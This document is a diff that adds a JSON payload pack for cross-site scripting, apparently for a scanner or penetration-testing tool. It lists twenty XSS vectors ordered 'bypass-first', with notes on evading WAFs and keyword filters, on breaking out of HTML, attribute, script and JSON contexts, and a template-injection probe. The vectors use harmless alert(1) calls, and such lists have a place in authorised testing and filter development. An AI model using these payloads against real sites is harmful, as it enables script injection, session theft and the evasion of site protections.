@@ -1,0 +1,27 @@
+{
+  "class": "xss",
+  "order": "bypass-first",
+  "note": "Context decides everything: identify reflection context (HTML node, attribute, JS string, JSON) before choosing. WAF-evading variants first.",
+  "payloads": [
+    { "id": "xss::01", "vector": "<svg/onload=alert(1)>", "note": "no-space tag splitting — common filter evasion" },
+    { "id": "xss::02", "vector": "<img src=x onerror=alert(1)>", "note": "classic but survives many naive filters" },
+    { "id": "xss::03", "vector": "<details open ontoggle=alert(1)>", "note": "rare-event handlers slip keyword lists" },
+    { "id": "xss::04", "vector": "<video><source onerror=alert(1)>", "note": "media element event" },
+    { "id": "xss::05", "vector": "<input autofocus onfocus=alert(1)>", "note": "no interaction needed" },
+    { "id": "xss::06", "vector": "<marquee onstart=alert(1)>x</marquee>", "note": "legacy-but-live handler" },
+    { "id": "xss::07", "vector": "<script/src=data:,alert(1)></script>", "note": "src-attribute trick, no inline content" },
+    { "id": "xss::08", "vector": "<svg><animate xlink:href=#x attributeName=href values=javascript:alert(1) />", "note": "SVG animate href — filter-safe sometimes" },
+    { "id": "xss::09", "vector": "\"><svg/onload=alert(1)>", "note": "HTML-node context breakout" },
+    { "id": "xss::10", "vector": "' autofocus onfocus=alert(1) x='", "note": "attribute-context breakout (quote pair)" },
+    { "id": "xss::11", "vector": "</script><script>alert(1)</script>", "note": "JS-string/script context breakout" },
+    { "id": "xss::12", "vector": "</textarea></svg/onload=alert(1)>", "note": "RCDATA context breakout" },
+    { "id": "xss::13", "vector": "javascript:alert(1)", "note": "href/src scheme context" },
+    { "id": "xss::14", "vector": "javas&#99;ript:alert(1)", "note": "HTML entity inside scheme" },
+    { "id": "xss::15", "vector": "data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+", "note": "data: URL (harmless alert payload)" },
+    { "id": "xss::16", "vector": "\\u003csvg onload=alert(1)\\u003e", "note": "JSON/API reflection — \\u escape survives JSON encode" },
+    { "id": "xss::17", "vector": "&lt;svg onload=alert(1)&gt;", "note": "double-encoding probe (decoder chain bugs)" },
+    { "id": "xss::18", "vector": "<img src=x onerror=alert&lpar;1&rpar;>", "note": "entity-encoded parens vs call-filters" },
+    { "id": "xss::19", "vector": "-alert(1)-", "note": "JS-expression context (template literals, math contexts)" },
+    { "id": "xss::20", "vector": "{{7*7}}", "note": "also detect template-injection misroute; if renders 49, switch to ssti pack" }
+  ]
+}
